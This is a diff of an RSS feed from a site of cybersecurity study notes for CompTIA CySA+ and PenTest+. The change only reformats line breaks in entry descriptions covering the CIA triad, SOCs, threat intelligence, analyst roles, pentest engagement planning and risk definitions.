-      <description> How to select the right control for the right job? By using the three tenets of security, also known as CIA (Confidentiality, Integrity or Availability)
-Examples:
-encryption = confidentiality digital signatures = integrity scaling up cloud resources = availability None of these technologies can provide CIA alone, but combined they uphold the three tenets of security </description>
+      <description> How to select the right control for the right job? By using the three tenets of security, also known as CIA (Confidentiality, Integrity or Availability)&#xA;Examples:&#xA;encryption = confidentiality digital signatures = integrity scaling up cloud resources = availability None of these technologies can provide CIA alone, but combined they uphold the three tenets of security </description>
     </item>
-    
     <item>
       <title></title>
       <link>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/soc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/soc/</guid>
-      <description>Security Operation Center, what is it &amp;amp; what does it do?
-A SOC is a location where security professionals monitor and protect critical information assets in an organization. SOCs usually exist for larger corporations, goverment agencies and health care organisations (this is because its costly for smaller orgs who usually outsource it) In order to be succesfull every SOC needs: Have the authority to operate (supported by policies) Have motivated and skilled staff (more important then you think) Incorporate processes into a single operations center equipped to perform incident response able to protect itself and the organisation at large Can seperate the signal from the noise Collaborate with other SOCs for data sharing The SOC should be the single point of contact for security, monitoring and incident respons </description>
+      <description>Security Operation Center, what is it &amp;amp; what does it do?&#xA;A SOC is a location where security professionals monitor and protect critical information assets in an organization. SOCs usually exist for larger corporations, goverment agencies and health care organisations (this is because its costly for smaller orgs who usually outsource it) In order to be succesfull every SOC needs: Have the authority to operate (supported by policies) Have motivated and skilled staff (more important then you think) Incorporate processes into a single operations center equipped to perform incident response able to protect itself and the organisation at large Can seperate the signal from the noise Collaborate with other SOCs for data sharing The SOC should be the single point of contact for security, monitoring and incident respons </description>
     </item>
-    
     <item>
       <title></title>
       <link>http://localhost/cmp-t-cysa&#43;/threat_intel/intelligence/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/threat_intel/intelligence/</guid>
-      <description>Security Intelligence is the process where data is generated and is then collected, processed, analyzed, and disseminated to provide insights into the security status of information systems Cyber Threat Intelligence is the investigation, collection, analysis and dissemination of information about emerging threats and threat sources to provide data about the external threat landscape
-So the difference between these two is: Security Intelligence is looking INWARD (how are our systems looking), while Cyber Threat Intelligence is looking OUTWARD (what are the attacker groups up to, what are the malware outbreaks or zero-day exploits.</description>
+      <description>Security Intelligence is the process where data is generated and is then collected, processed, analyzed, and disseminated to provide insights into the security status of information systems Cyber Threat Intelligence is the investigation, collection, analysis and dissemination of information about emerging threats and threat sources to provide data about the external threat landscape&#xA;So the difference between these two is: Security Intelligence is looking INWARD (how are our systems looking), while Cyber Threat Intelligence is looking OUTWARD (what are the attacker groups up to, what are the malware outbreaks or zero-day exploits.</description>
     </item>
-    
     <item>
       <title></title>
       <link>http://localhost/cmp-t-cysa&#43;/threat_intel/intelligence_sources/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/threat_intel/intelligence_sources/</guid>
-      <description>We have to identify some factors to weigh the value of the intelligence that we are getting:
-Timeliness (ensures an intel source is up-to-date) Relevancy (ensures an intel source matches its intended use case) Accuracy (ensures an intel source produces effective results. IE: the information needs to be valid &amp;amp; true. Eliminating false positives is important.) Confidence level (ensures an intel source produces qualified statements about reliability. &amp;ldquo;Putting a grade on how good this information is&amp;rdquo;) The three place where you can get information from is:</description>
+      <description>We have to identify some factors to weigh the value of the intelligence that we are getting:&#xA;Timeliness (ensures an intel source is up-to-date) Relevancy (ensures an intel source matches its intended use case) Accuracy (ensures an intel source produces effective results. IE: the information needs to be valid &amp;amp; true. Eliminating false positives is important.) Confidence level (ensures an intel source produces qualified statements about reliability. &amp;ldquo;Putting a grade on how good this information is&amp;rdquo;) The three place where you can get information from is:</description>
     </item>
-    
     <item>
       <title></title>
       <link>http://localhost/cmp-t-cysa&#43;/threat_intel/security_intelligence_cycle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/threat_intel/security_intelligence_cycle/</guid>
-      <description>Intelligence is a process
-Requirements (Planning &amp;amp; Direction) Sets out the goals for the intelligence gathering effort (what do we wanna collec? what do we care about?)
-Collection &amp;amp; Processing Implemented by software tools such as SIEMS to gather data which is then processed for later analysis.
-The processing part is where we will convert all the data into a standard format.
-Analysis Performed against the given use cases from the planning phase and may utilize automated analysis, AI, and machine learning.</description>
+      <description>Intelligence is a process&#xA;Requirements (Planning &amp;amp; Direction) Sets out the goals for the intelligence gathering effort (what do we wanna collec? what do we care about?)&#xA;Collection &amp;amp; Processing Implemented by software tools such as SIEMS to gather data which is then processed for later analysis.&#xA;The processing part is where we will convert all the data into a standard format.&#xA;Analysis Performed against the given use cases from the planning phase and may utilize automated analysis, AI, and machine learning.</description>
     </item>
-    
     <item>
       <title>Cyber Security Analyst Role</title>
       <link>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/cybersecurity_analyst_and_soc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-cysa&#43;/roles_and_responsibilities/cybersecurity_analyst_and_soc/</guid>
-      <description>What is a Cyber Security Analyst?
-A senior position within an organisation security team with direct responsibility for protecting sensitive information and preventing unauthorized access to electronic data and the systems that protect it.
-Any device that processes or uses the organisations information is covered by the role of a Cyber Security Analyst.
-Cybersecurity teams contain junior &amp;amp; senior analysts.
-Analysts are expected to have years of experience working within IT and IT Security.</description>
+      <description>What is a Cyber Security Analyst?&#xA;A senior position within an organisation security team with direct responsibility for protecting sensitive information and preventing unauthorized access to electronic data and the systems that protect it.&#xA;Any device that processes or uses the organisations information is covered by the role of a Cyber Security Analyst.&#xA;Cybersecurity teams contain junior &amp;amp; senior analysts.&#xA;Analysts are expected to have years of experience working within IT and IT Security.</description>
     </item>
-    
     <item>
       <title>Planning an Engagement</title>
       <link>http://localhost/cmp-t-pentest&#43;/planning/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-pentest&#43;/planning/</guid>
-      <description>An engagement is a singular penetration testing project planned and scoped by the requesting client and the performing analysts.
-Domain 1: Planning &amp;amp; Scoping
-Objective 1.1: Compare and contrast governance, risk, and compliance concepts.
-Objective 1.2: Explain the importance of scoping and organizational/customer requirements.
-Objective 1.3: Given a scenario, demonstrate an ethical hacking mindset by maintaining.professionalism and integrity.
-Risk is made out of threats and vulnerabilities.
-Penetration Tester: an authorized threat actor who tries to to identify the ways an unauthorized intruder could damage a network.</description>
+      <description>An engagement is a singular penetration testing project planned and scoped by the requesting client and the performing analysts.&#xA;Domain 1: Planning &amp;amp; Scoping&#xA;Objective 1.1: Compare and contrast governance, risk, and compliance concepts.&#xA;Objective 1.2: Explain the importance of scoping and organizational/customer requirements.&#xA;Objective 1.3: Given a scenario, demonstrate an ethical hacking mindset by maintaining.professionalism and integrity.&#xA;Risk is made out of threats and vulnerabilities.&#xA;Penetration Tester: an authorized threat actor who tries to to identify the ways an unauthorized intruder could damage a network.</description>
     </item>
-    
     <item>
       <title>Risk</title>
       <link>http://localhost/cmp-t-pentest&#43;/risk/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
       <guid>http://localhost/cmp-t-pentest&#43;/risk/</guid>
-      <description>What is risk &amp;amp; where does risk exist?
-Risk = the probability that a threat will be realized.
-If you are a Cybersec analyst (blue teamer) you&amp;rsquo;re job is to minimize vulnerabilities.
-If you are working as a pentester you&amp;rsquo;re job is to find and exploit vulnerabilities to proof that the network is truelly vulnerable to an outside attack.
-Vulnerability = any weakness in the system design or implementation
-Threat = anything that could cause harm, loss, damage or compromise to IT systems.</description>
+      <description>What is risk &amp;amp; where does risk exist?&#xA;Risk = the probability that a threat will be realized.&#xA;If you are a Cybersec analyst (blue teamer) you&amp;rsquo;re job is to minimize vulnerabilities.&#xA;If you are working as a pentester you&amp;rsquo;re job is to find and exploit vulnerabilities to proof that the network is truelly vulnerable to an outside attack.&#xA;Vulnerability = any weakness in the system design or implementation&#xA;Threat = anything that could cause harm, loss, damage or compromise to IT systems.</description>
     </item>
-    
   </channel>
 </rss>
